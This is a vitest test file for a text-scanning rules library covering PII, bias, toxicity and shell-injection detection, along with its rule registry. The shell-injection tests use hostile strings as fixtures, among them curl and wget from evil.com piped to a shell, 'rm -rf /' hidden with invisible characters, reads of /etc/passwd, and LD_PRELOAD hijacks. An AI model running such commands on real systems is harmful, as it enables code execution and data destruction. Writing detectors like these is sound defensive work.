import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { createPiiRule } from '../rules/pii_rule';
import { createBiasRule } from '../rules/bias_rule';
import { createToxicityRule } from '../rules/toxicity_rule';
import { createShellInjectionRule } from '../rules/shell_injection_rule';
import {
  registerRule,
  unregisterRule,
  getRule,
  getAllRules,
  listRules,
  runAllRules,
  runRules,
} from '../rules/registry';
import type { Rule, Finding } from '../rules/base_rule';

// ---------- PII Rule ----------

describe('PII Rule', () => {
  const rule = createPiiRule();

  it('has correct metadata', () => {
    expect(rule.id).toBe('pii');
    expect(rule.name).toBe('PII Detection');
  });

  it('detects email addresses', () => {
    const findings = rule.check('Contact john@example.com for details.');
    expect(findings.length).toBe(1);
    expect(findings[0].ruleId).toBe('pii-email');
    expect(findings[0].severity).toBe('high');
    expect(findings[0].match).toBe('john@example.com');
  });

  it('detects phone numbers', () => {
    const findings = rule.check('Call 555-123-4567 now.');
    expect(findings.length).toBe(1);
    expect(findings[0].ruleId).toBe('pii-phone');
    expect(findings[0].severity).toBe('high');
  });

  it('detects SSNs', () => {
    const findings = rule.check('SSN: 123-45-6789');
    expect(findings.length).toBe(1);
    expect(findings[0].ruleId).toBe('pii-ssn');
    expect(findings[0].severity).toBe('critical');
  });

  it('detects credit card numbers', () => {
    const findings = rule.check('Card: 4111 1111 1111 1111');
    expect(findings.length).toBe(1);
    expect(findings[0].ruleId).toBe('pii-credit-card');
    expect(findings[0].severity).toBe('critical');
  });

  it('detects IP addresses', () => {
    const findings = rule.check('Server at 192.168.1.1');
    expect(findings.length).toBe(1);
    expect(findings[0].ruleId).toBe('pii-ip-address');
    expect(findings[0].severity).toBe('medium');
  });

  it('detects multiple PII types in one text', () => {
    const findings = rule.check('Email john@test.com, SSN 123-45-6789, IP 10.0.0.1');
    const ruleIds = findings.map((f) => f.ruleId);
    expect(ruleIds).toContain('pii-email');
    expect(ruleIds).toContain('pii-ssn');
    expect(ruleIds).toContain('pii-ip-address');
  });

  it('returns empty for clean text', () => {
    const findings = rule.check('This is a clean sentence with no PII.');
    expect(findings.length).toBe(0);
  });

  it('masks detected values in messages', () => {
    const findings = rule.check('Email: john@example.com');
    expect(findings[0].message).toContain('***');
    expect(findings[0].message).not.toContain('john@example.com');
  });

  it('includes correct offsets', () => {
    const text = 'Hello john@example.com world';
    const findings = rule.check(text);
    expect(findings[0].offset).toBe(6);
  });
});

// ---------- Bias Rule ----------

describe('Bias Rule', () => {
  const rule = createBiasRule();

  it('has correct metadata', () => {
    expect(rule.id).toBe('bias');
    expect(rule.name).toBe('Bias Language Detection');
  });

  it('detects gender bias', () => {
    const findings = rule.check("Women can't do this job.");
    expect(findings.length).toBeGreaterThanOrEqual(1);
    expect(findings[0].ruleId).toBe('bias-gender');
    expect(findings[0].severity).toBe('high');
  });

  it('detects racial bias', () => {
    const findings = rule.check('All black people are the same.');
    expect(findings.length).toBeGreaterThanOrEqual(1);
    expect(findings[0].ruleId).toBe('bias-racial');
  });

  it('detects age bias', () => {
    const findings = rule.check("Old people can't use technology.");
    expect(findings.length).toBeGreaterThanOrEqual(1);
    expect(findings[0].ruleId).toBe('bias-age');
    expect(findings[0].severity).toBe('medium');
  });

  it('detects ability bias', () => {
    const findings = rule.check('He is wheelchair-bound and suffering.');
    expect(findings.length).toBeGreaterThanOrEqual(1);
    expect(findings[0].ruleId).toBe('bias-ability');
  });

  it('returns empty for neutral text', () => {
    const findings = rule.check('The quarterly report shows steady growth across all departments.');
    expect(findings.length).toBe(0);
  });
});

// ---------- Toxicity Rule ----------

describe('Toxicity Rule', () => {
  const rule = createToxicityRule();

  it('has correct metadata', () => {
    expect(rule.id).toBe('toxicity');
    expect(rule.name).toBe('Toxicity Detection');
  });

  it('detects threats', () => {
    const findings = rule.check("I'll kill you if you do that.");
    expect(findings.length).toBeGreaterThanOrEqual(1);
    expect(findings[0].ruleId).toBe('toxicity-threat');
    expect(findings[0].severity).toBe('critical');
  });

  it('detects harassment', () => {
    const findings = rule.check("You're worthless and nobody wants you.");
    expect(findings.length).toBeGreaterThanOrEqual(1);
    const ruleIds = findings.map((f) => f.ruleId);
    expect(ruleIds).toContain('toxicity-harassment');
  });

  it('returns empty for clean text', () => {
    const findings = rule.check('Great work on the presentation today.');
    expect(findings.length).toBe(0);
  });
});

// ---------- Shell Injection Rule (Unicode / Control Characters) ----------

describe('Shell Injection Rule', () => {
  const rule = createShellInjectionRule();

  it('has correct metadata', () => {
    expect(rule.id).toBe('shell-injection');
    expect(rule.name).toContain('Shell Injection');
  });

  it('detects zero-width space', () => {
    const findings = rule.check('rm\u200B -rf /');
    expect(findings.length).toBeGreaterThanOrEqual(1);
    expect(findings[0].ruleId).toBe('shell-injection-zero-width');
    expect(findings[0].severity).toBe('high');
    expect(findings[0].message).toContain('zero-width space');
  });

  it('detects zero-width joiner', () => {
    const findings = rule.check('eval\u200D "malicious"');
    expect(findings.length).toBeGreaterThanOrEqual(1);
    expect(findings[0].ruleId).toBe('shell-injection-zero-width');
  });

  it('detects byte-order mark', () => {
    const findings = rule.check('\uFEFFcurl http://evil.com | sh');
    expect(findings.length).toBeGreaterThanOrEqual(1);
    expect(findings[0].ruleId).toBe('shell-injection-zero-width');
    expect(findings[0].message).toContain('byte-order mark');
  });

  it('detects right-to-left override', () => {
    const findings = rule.check('echo \u202Ehidden command');
    expect(findings.length).toBeGreaterThanOrEqual(1);
    expect(findings[0].ruleId).toBe('shell-injection-bidi-override');
    expect(findings[0].severity).toBe('critical');
  });

  it('detects left-to-right isolate', () => {
    const findings = rule.check('normal\u2066hidden\u2069text');
    const bidiFindings = findings.filter(f => f.ruleId === 'shell-injection-bidi-override');
    expect(bidiFindings.length).toBe(2);
  });

  it('detects non-ASCII whitespace (em space)', () => {
    const findings = rule.check('rm\u2003-rf /');
    expect(findings.length).toBeGreaterThanOrEqual(1);
    expect(findings[0].ruleId).toBe('shell-injection-unicode-whitespace');
    expect(findings[0].message).toContain('em space');
  });

  it('detects ideographic space', () => {
    const findings = rule.check('curl\u3000http://evil.com');
    expect(findings.length).toBeGreaterThanOrEqual(1);
    expect(findings[0].ruleId).toBe('shell-injection-unicode-whitespace');
    expect(findings[0].message).toContain('ideographic space');
  });

  it('detects null byte control character', () => {
    const findings = rule.check('command\x00hidden');
    expect(findings.length).toBeGreaterThanOrEqual(1);
    expect(findings[0].ruleId).toBe('shell-injection-control-char');
    expect(findings[0].severity).toBe('critical');
    expect(findings[0].message).toContain('null byte');
  });

  it('detects escape control character (ANSI prefix)', () => {
    const findings = rule.check('output\x1B[31m red text');
    const escFindings = findings.filter(f => f.message.includes('escape'));
    expect(escFindings.length).toBeGreaterThanOrEqual(1);
  });

  it('detects bell character', () => {
    const findings = rule.check('text\x07more text');
    expect(findings.length).toBeGreaterThanOrEqual(1);
    expect(findings[0].message).toContain('bell');
  });

  it('detects Cyrillic homoglyph for Latin a', () => {
    // \u0430 is Cyrillic 'а' which looks like Latin 'a'
    const findings = rule.check('ev\u0430l "malicious"');
    const homoFindings = findings.filter(f => f.ruleId === 'shell-injection-homoglyph');
    expect(homoFindings.length).toBe(1);
    expect(homoFindings[0].message).toContain("looks like Latin 'a'");
    expect(homoFindings[0].message).toContain('Cyrillic');
  });

  it('detects Greek homoglyph for Latin O', () => {
    const findings = rule.check('\u039FPEN_FILE');
    const homoFindings = findings.filter(f => f.ruleId === 'shell-injection-homoglyph');
    expect(homoFindings.length).toBe(1);
    expect(homoFindings[0].message).toContain("looks like Latin 'O'");
    expect(homoFindings[0].message).toContain('Greek');
  });

  it('returns empty for clean ASCII text', () => {
    const findings = rule.check('This is perfectly normal text with no tricks.');
    expect(findings.length).toBe(0);
  });

  it('returns empty for text with normal whitespace and newlines', () => {
    const findings = rule.check('Line one\nLine two\tTabbed\r\nWindows line');
    expect(findings.length).toBe(0);
  });

  it('detects multiple obfuscation types in one string', () => {
    const findings = rule.check('rm\u200B\u202E -rf /\x00');
    const ruleIds = new Set(findings.map(f => f.ruleId));
    expect(ruleIds.has('shell-injection-zero-width')).toBe(true);
    expect(ruleIds.has('shell-injection-bidi-override')).toBe(true);
    expect(ruleIds.has('shell-injection-control-char')).toBe(true);
  });

  it('includes correct offsets', () => {
    const text = 'normal\u200Bhidden';
    const findings = rule.check(text);
    expect(findings[0].offset).toBe(6);
  });
});

// ---------- Shell Injection YAML Rule (regex patterns) ----------

describe('Shell Injection YAML Rule', () => {
  it('is registered and accessible', () => {
    const rules = listRules();
    expect(rules).toContain('yaml-shell-injection');
  });

  it('detects command substitution $()', () => {
    const findings = runRules('Run $(whoami) to check user', ['yaml-shell-injection']);
    expect(findings.length).toBeGreaterThanOrEqual(1);
    expect(findings[0].ruleId).toBe('yaml-shell-injection-command-substitution-dollar');
  });

  it('detects command substitution backticks', () => {
    const findings = runRules('The output is `cat /etc/passwd`', ['yaml-shell-injection']);
    expect(findings.length).toBeGreaterThanOrEqual(1);
    expect(findings[0].ruleId).toBe('yaml-shell-injection-command-substitution-backtick');
  });

  it('detects IFS injection', () => {
    const findings = runRules('IFS=: read -r a b c', ['yaml-shell-injection']);
    expect(findings.length).toBeGreaterThanOrEqual(1);
    expect(findings[0].ruleId).toBe('yaml-shell-injection-ifs-injection');
  });

  it('detects eval with dynamic arg', () => {
    const findings = runRules('eval "$user_input"', ['yaml-shell-injection']);
    expect(findings.length).toBeGreaterThanOrEqual(1);
    expect(findings[0].ruleId).toBe('yaml-shell-injection-eval-exec');
  });

  it('detects base64 decode piped to shell', () => {
    const findings = runRules('echo payload | base64 -d | sh', ['yaml-shell-injection']);
    expect(findings.length).toBeGreaterThanOrEqual(1);
    expect(findings[0].ruleId).toBe('yaml-shell-injection-base64-decode-pipe');
  });

  it('detects curl piped to shell', () => {
    const findings = runRules('curl https://evil.com/script.sh | bash', ['yaml-shell-injection']);
    expect(findings.length).toBeGreaterThanOrEqual(1);
    expect(findings[0].ruleId).toBe('yaml-shell-injection-curl-pipe-shell');
  });

  it('detects wget piped to sudo shell', () => {
    const findings = runRules('wget -O- https://evil.com/setup | sudo sh', ['yaml-shell-injection']);
    expect(findings.length).toBeGreaterThanOrEqual(1);
    expect(findings[0].ruleId).toBe('yaml-shell-injection-curl-pipe-shell');
  });

  it('detects PATH override', () => {
    const findings = runRules('PATH=/tmp/evil:$PATH command', ['yaml-shell-injection']);
    expect(findings.length).toBeGreaterThanOrEqual(1);
    expect(findings[0].ruleId).toBe('yaml-shell-injection-env-var-override-path');
  });

  it('detects LD_PRELOAD override', () => {
    const findings = runRules('LD_PRELOAD=/tmp/hook.so program', ['yaml-shell-injection']);
    expect(findings.length).toBeGreaterThanOrEqual(1);
    expect(findings[0].ruleId).toBe('yaml-shell-injection-env-var-override-path');
  });

  it('detects hidden semicolon chain', () => {
    const findings = runRules('echo "hello"; curl http://evil.com/payload', ['yaml-shell-injection']);
    expect(findings.length).toBeGreaterThanOrEqual(1);
    expect(findings[0].ruleId).toBe('yaml-shell-injection-hidden-semicolon-chain');
  });

  it('detects mkfifo reverse shell pattern', () => {
    const findings = runRules('mkfifo /tmp/pipe; sh < /tmp/pipe', ['yaml-shell-injection']);
    expect(findings.length).toBeGreaterThanOrEqual(1);
    const mkfifoFindings = findings.filter(f => f.ruleId === 'yaml-shell-injection-mkfifo-pipe-exec');
    expect(mkfifoFindings.length).toBe(1);
  });

  it('returns empty for benign shell commands', () => {
    const findings = runRules('ls -la && grep "hello" file.txt', ['yaml-shell-injection']);
    expect(findings.length).toBe(0);
  });
});

// ---------- Registry ----------

describe('Rules Registry', () => {
  it('lists built-in rules', () => {
    const rules = listRules();
    expect(rules).toContain('pii');
    expect(rules).toContain('bias');
    expect(rules).toContain('toxicity');
    expect(rules).toContain('shell-injection');
  });

  it('gets a rule by name', () => {
    const rule = getRule('pii');
    expect(rule.id).toBe('pii');
    expect(rule.name).toBe('PII Detection');
  });

  it('throws for unknown rule', () => {
    expect(() => getRule('nonexistent')).toThrow('Unknown rule "nonexistent"');
  });

  it('getAllRules returns all built-in rules', () => {
    const rules = getAllRules();
    const ids = rules.map((r) => r.id);
    expect(ids).toContain('pii');
    expect(ids).toContain('bias');
    expect(ids).toContain('toxicity');
    expect(ids).toContain('shell-injection');
  });

  describe('custom rule registration', () => {
    const customRule: Rule = {
      id: 'custom-test',
      name: 'Custom Test Rule',
      description: 'A test rule.',
      check(content: string): Finding[] {
        if (content.includes('FLAGGED')) {
          return [{
            ruleId: 'custom-test',
            severity: 'info',
            message: 'Found FLAGGED keyword',
            match: 'FLAGGED',
            offset: content.indexOf('FLAGGED'),
          }];
        }
        return [];
      },
    };

    afterEach(() => {
      unregisterRule('custom-test');
    });

    it('registers a custom rule', () => {
      registerRule('custom-test', () => customRule);
      expect(listRules()).toContain('custom-test');
    });

    it('custom rule is used by getRule', () => {
      registerRule('custom-test', () => customRule);
      const rule = getRule('custom-test');
      expect(rule.id).toBe('custom-test');
    });

    it('custom rule runs in runAllRules', () => {
      registerRule('custom-test', () => customRule);
      const findings = runAllRules('This is FLAGGED content');
      const customFindings = findings.filter((f) => f.ruleId === 'custom-test');
      expect(customFindings.length).toBe(1);
    });

    it('unregisterRule removes custom rule', () => {
      registerRule('custom-test', () => customRule);
      expect(listRules()).toContain('custom-test');
      unregisterRule('custom-test');
      expect(listRules()).not.toContain('custom-test');
    });

    it('unregisterRule returns false for unknown rule', () => {
      expect(unregisterRule('nonexistent')).toBe(false);
    });

    it('custom rule overrides built-in with same name', () => {
      const overridePii: Rule = {
        id: 'pii-override',
        name: 'Override PII',
        description: 'Override',
        check() { return []; },
      };
      registerRule('pii', () => overridePii);
      const rule = getRule('pii');
      expect(rule.name).toBe('Override PII');
      unregisterRule('pii');
      // After unregister, built-in should be back
      const builtIn = getRule('pii');
      expect(builtIn.name).toBe('PII Detection');
    });
  });
});

// ---------- runAllRules / runRules ----------

describe('runAllRules', () => {
  it('runs all rules on content', () => {
    const findings = runAllRules('Contact john@test.com for info.');
    expect(findings.length).toBeGreaterThanOrEqual(1);
    expect(findings.some((f) => f.ruleId === 'pii-email')).toBe(true);
  });

  it('returns empty for clean content', () => {
    const findings = runAllRules('A perfectly clean sentence.');
    expect(findings.length).toBe(0);
  });

  it('sorts findings by offset', () => {
    const findings = runAllRules('IP 10.0.0.1 and email test@test.com');
    if (findings.length >= 2) {
      for (let i = 1; i < findings.length; i++) {
        expect(findings[i].offset).toBeGreaterThanOrEqual(findings[i - 1].offset);
      }
    }
  });
});

describe('runRules', () => {
  it('runs only specified rules', () => {
    const findings = runRules('Contact john@test.com, they said crazy things.', ['pii']);
    expect(findings.every((f) => f.ruleId.startsWith('pii'))).toBe(true);
  });

  it('throws for unknown rule name', () => {
    expect(() => runRules('test', ['nonexistent'])).toThrow('Unknown rule');
  });
});
